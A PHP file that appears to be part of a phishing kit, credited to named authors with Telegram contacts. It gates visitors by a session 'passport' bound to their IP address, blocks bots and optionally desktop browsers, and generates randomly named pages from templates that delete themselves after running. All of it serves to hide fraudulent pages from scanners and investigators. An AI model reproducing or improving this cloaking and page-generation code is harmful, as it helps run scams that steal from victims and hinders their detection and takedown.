<?php 

/***************************************************
*    AUTHORS/CODERS : S3IKO && J33H4N @ SIGMADEVS
*    CONTACT : t.me/els3iko | t.me/j33h4n
*    OUR CHANNEL : https://t.me/+Fh3FAJBUw680YTE8 
*
*    OUR SCRIPTS ARE NOT FOR ANY ILLEGAL USE. YOU ARE THE RESPONSIBLE.
***************************************************/


@session_start();
@date_default_timezone_set("Australia/Sydney");
require (__DIR__).'/bots/father.php';
require (__DIR__)."/md.php";
require (__DIR__)."/config.php";
$detect = new Mobile_Detect;
if(!$detect->isMobile() and strtolower($block_pc)=="on"){
   exit(header("location: out.php"));
 }

 if(!isset($_SESSION['passport']) OR @$_SESSION['passport'] != $_SERVER['REMOTE_ADDR']){
  // EXIT IF VISITOR HAS NO PASSPORT
  header("location: out.php");
  exit;
}


function createPage($name){
	$new = (__dir__)."/post/".uniqid()."-".rand(0, 99999).".php";
     $html = file_get_contents((__dir__)."/post/source/$name.txt");
	$fp =fopen($new, "w+");
	fwrite($fp, $html);
     fwrite($fp, "<?php unlink(basename(\$_SERVER['SCRIPT_NAME'])); ?>");
	fclose($fp);
     return basename($new);
}



?>